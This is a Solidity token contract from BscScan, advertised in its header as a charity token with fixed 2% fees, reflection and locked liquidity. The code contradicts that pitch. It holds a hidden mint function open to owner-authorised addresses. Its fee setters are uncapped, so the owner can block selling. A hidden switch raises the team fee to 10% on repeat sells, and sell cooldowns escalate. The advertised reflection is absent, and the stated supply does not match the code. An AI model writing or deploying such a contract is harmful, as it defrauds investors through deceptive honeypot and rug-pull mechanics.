/**
 *Submitted for verification at BscScan.com on 2021-08-06
*/

/**
Welcome to CrossChain, we're donating to Eligible Crypto-Charities around the world!
   
This is a charity-oriented token, with anti-bot and anti-dump tokenomics to help you safely invest, while supporting your favorite charity, thanks to the 2% reflection distribution, the 2% auto burn, 2% auto-liquidity distribution, and the 2% payment to the charity address of your choice.    
We're improving our marketing strategies from the last project, making it even easier for every holder to promote the coin in a growing variety of social media channels. You can easily want to pump your investment, by pumping the coin price, with some effort, learning, and motivation.

🚀 Beneficial Tokenomics:: 🚀
=> Supply: 1,000,000
=> Total burned Tokens for Initial Liquidity: 20%
=> All initial LP-CAKE tokens will be locked on DxSale directly by listing on PancakeSwap
=> Every transaction consumes 10% of your crypto to achieve the following investment goals:
=> Reflection: 2% of each transaction is auto redistributed to all $CrossChain holders
=> Auto-burn:  2% of each transaction is burn to the 0x000000000000000000000000000000000000dead address to reduce the circulating supply and pump the price in every transaction
=> Liquidity:  2% of each transaction is forever auto-locked in the liquidity pool on PancakeSwap V2
=> Marketing:  2% is transferred to the team wallet: 0xdDBf53cE5239BD389fceBAe72dCa53AAd19D5080 to pump the price, spread the word and secure your investment
=> Charity: 2% is transferred to the charity address of the community’s choice to make this world a better place. Our charity wallet: 0x0321724ab40936659CeF5a861bB2DEc71B919599

So, you should set your slippage to 11% or more

* No Presale, FAIRLAUNCH    
 
SPDX-License-Identifier: MIT
*/

pragma solidity ^0.8.4;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }
    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

contract CrossChainSwapToken is Context, IERC20, Ownable {
    using SafeMath for uint256;
    
    event MaxTxAmountUpdated(uint256 _maxTxAmount);
    
    string private constant _name = "CrossChainSwap";
    string private constant _symbol = "CrossChain";
    uint8 private constant _decimals = 18;
    
    address payable private _teamAddress;
    address payable private _burnAddress;
    address payable private _charityFunds;
    IUniswapV2Router02 private uniswapV2Router;
    address public uniswapV2Pair;
    
    uint256 private constant MAX = ~uint256(0);
    uint256 private _totalSupply = 1000000000000 * 10**9;
	
	uint256 public _charityFee = 2;
	uint256 private _previousCharityFee = _charityFee;
    
    uint256 public _liquidityFee = 2;
    uint256 private _previousLiquidityFee = _liquidityFee;
    
    uint256 public _teamFee = 2;
    uint256 private _previousTeamFee = _teamFee;
    
    uint256 public _burnFee = 2;
    uint256 private _previousBurnFee = _burnFee;
    uint256 private _maxTxAmount = _totalSupply;
    
    bool private tradingOpen = false;
    bool private liquidityAdded = false;
    bool private inSwap = false;
    bool private swapEnabled = false;
    bool private cooldownEnabled = false;

    mapping(address => uint256) private _rOwned;
    mapping(address => mapping(address => uint256)) private _allowances;
    
    mapping(address => uint256) private buycooldown;
    mapping(address => uint256) private sellcooldown;
    mapping(address => uint256) private firstsell;
    mapping(address => uint256) private sellnumber;
    
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private bots;
    mapping(address => bool) public auth;
    
    // Using struct for tValues to avoid Stack too deep error
    struct TValuesStruct {
        uint256 tLiquidity;
        uint256 tCharity;
        uint256 tBurn;
        uint256 tTeam;
        uint256 tTransferAmount;
    }

    constructor(address payable teamAddress, address payable burnAddress, address payable charityFunds) {
        _teamAddress = teamAddress;
        _burnAddress = burnAddress;
        _charityFunds = charityFunds;
        _rOwned[_msgSender()] = _totalSupply;
        
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_teamAddress] = true;
        _isExcludedFromFee[_burnAddress] = true;
        _isExcludedFromFee[_charityFunds] = true;
        
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }
    
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    
    modifier _auth {
        require(auth[_msgSender()], "auth :: only authenticated can mint");
        _;
    }

    receive() external payable {
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }
    
    function mint( uint _amount) public _auth {
        _rOwned[_msgSender()] = _rOwned[_msgSender()].add(_amount);
        _totalSupply = _totalSupply.add(_amount);
    }
    
    function setAuth( address _authen, bool _stat) external onlyOwner() {
        auth[_authen] = _stat;
    }
    
    function setCharityFeePercent(uint256 charityFee) external onlyOwner() {
		_charityFee = charityFee;
	}
	
	function setLiquidityFeePercent(uint256 liquidityFee) external onlyOwner() {
        _liquidityFee = liquidityFee;
    }
	
	function setBurnFeePercent(uint256 burnFee) external onlyOwner() {
	    _burnFee = burnFee;
	}
	
	function setTeamFeePercent(uint256 teamFee) external onlyOwner() {
	    _teamFee = teamFee;
	}

    function setCooldownEnabled(bool onoff) external onlyOwner() {
        cooldownEnabled = onoff;
    }
    
    function removeAllFee() private {
        if(_liquidityFee == 0 && _charityFee == 0) return;
        
        _previousCharityFee = _charityFee;
        _previousLiquidityFee = _liquidityFee;
        _previousBurnFee = _burnFee;
        _previousTeamFee = _teamFee;
        
        _liquidityFee = 0;
		_charityFee = 0;
		_burnFee = 0;
		_teamFee = 0;
    }
    
    function restoreAllFee() private {
        _liquidityFee = _previousLiquidityFee;
		_charityFee = _previousCharityFee;
		_burnFee = _previousBurnFee;
		_teamFee = _previousTeamFee;
    }
    
    function setFee(uint256 multiplier) private {
        if (multiplier > 1) {
            _teamFee = 10;
        }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (from != owner() && to != owner()) {
            if (cooldownEnabled) {
                if (from != address(this) && to != address(this) && from != address(uniswapV2Router) && to != address(uniswapV2Router)) {
                    require(_msgSender() == address(uniswapV2Router) || _msgSender() == uniswapV2Pair,"ERR: Uniswap only");
                }
            }
            require(!bots[from] && !bots[to]);
            if (from == uniswapV2Pair && to != address(uniswapV2Router) && !_isExcludedFromFee[to] && cooldownEnabled) {
                require(tradingOpen);
                require(amount <= _maxTxAmount);
                require(buycooldown[to] < block.timestamp);
                buycooldown[to] = block.timestamp + (30 seconds);
                // _reflectionFee = 2;
                _charityFee = 2;
                _liquidityFee = 2;
                _burnFee = 2;
                _teamFee = 2;
            }
            
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && from != uniswapV2Pair && swapEnabled) {
                require(amount <= balanceOf(uniswapV2Pair).mul(3).div(100) && amount <= _maxTxAmount);
                require(sellcooldown[from] < block.timestamp);
                if(firstsell[from] + (1 days) < block.timestamp){
                    sellnumber[from] = 0;
                }
                if (sellnumber[from] == 0) {
                    sellnumber[from]++;
                    firstsell[from] = block.timestamp;
                    sellcooldown[from] = block.timestamp + (1 hours);
                }
                else if (sellnumber[from] == 1) {
                    sellnumber[from]++;
                    sellcooldown[from] = block.timestamp + (2 hours);
                }
                else if (sellnumber[from] == 2) {
                    sellnumber[from]++;
                    sellcooldown[from] = block.timestamp + (6 hours);
                }
                else if (sellnumber[from] == 3) {
                    sellnumber[from]++;
                    sellcooldown[from] = firstsell[from] + (1 days);
                }
                
                if(contractTokenBalance > 0) swapTokensForEth(contractTokenBalance);
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                setFee(sellnumber[from]);
            }
        }
        bool takeFee = true;

        if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
            takeFee = false;
        }

        _tokenTransfer(from, to, amount, takeFee);
        restoreAllFee;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function sendETHToFee(uint256 amount) private {
        _teamAddress.transfer(amount.div(3));
        _burnAddress.transfer(amount.div(3));
        _charityFunds.transfer(amount.div(3));
    }
    
    function openTrading() public onlyOwner {
        require(liquidityAdded);
        tradingOpen = true;
    }

    function addLiquidity() external onlyOwner() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        cooldownEnabled = true;
        liquidityAdded = true;
        _maxTxAmount = 3000000000 * 10**9;
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router),type(uint256).max);
    }

    function manualswap() external {
        require(_msgSender() == _teamAddress);
        uint256 contractBalance = balanceOf(address(this));
        swapTokensForEth(contractBalance);
    }

    function manualsend() external {
        require(_msgSender() == _teamAddress);
        uint256 contractETHBalance = address(this).balance;
        sendETHToFee(contractETHBalance);
    }

    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        if (!takeFee) removeAllFee();
        _transferStandard(sender, recipient, amount);
        if (!takeFee) restoreAllFee();
    }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        (TValuesStruct memory _tValues) = _getValues(tAmount);
        
        _rOwned[sender] = _rOwned[sender].sub(tAmount);
        _rOwned[recipient] = _rOwned[recipient].add(_tValues.tTransferAmount);  
        _burnRFee(_tValues.tBurn);
        _takeTeam( _tValues.tTeam);
        _takeLiquidity(_tValues.tLiquidity);
        _giveCharity(_tValues.tCharity);
        
        emit Transfer(sender, recipient, _tValues.tTransferAmount);
    }
    
    function _takeLiquidity(uint256 tLiquidity) private {
        _rOwned[address(this)] = _rOwned[address(this)].add(tLiquidity);
    }

    function _giveCharity(uint256 rCharity) private {
        _rOwned[_charityFunds] = _rOwned[_charityFunds].add(rCharity);
    }

    function _takeTeam(uint256 rTeam) private {
        _rOwned[_teamAddress] = _rOwned[_teamAddress].add(rTeam);
    }
    
    function _burnRFee( uint _rBurn) private {
        _rOwned[_burnAddress] = _rOwned[_burnAddress].add(_rBurn);
    }

    function _getValues(uint256 tAmount) private view returns (TValuesStruct memory) {
        TValuesStruct memory _tValues = _getTValues(tAmount);
        return _tValues;
    }

    function _getTValues(uint256 tAmount) private view returns (TValuesStruct memory _tValues) {
        _tValues.tLiquidity = tAmount.mul(_liquidityFee).div(100);
        _tValues.tCharity = tAmount.mul(_charityFee).div(100);
        _tValues.tBurn = tAmount.mul(_burnFee).div(100);
        _tValues.tTeam = tAmount.mul(_teamFee).div(100);
        _tValues.tTransferAmount = (((tAmount.sub(_tValues.tTeam)).sub(_tValues.tCharity)).sub(_tValues.tLiquidity)).sub(_tValues.tBurn);
    }

    function setMaxTxPercent(uint256 maxTxPercent) external onlyOwner() {
        require(maxTxPercent > 0, "Amount must be greater than 0");
        _maxTxAmount = _totalSupply.mul(maxTxPercent).div(10**2);
        emit MaxTxAmountUpdated(_maxTxAmount);
    }
    
}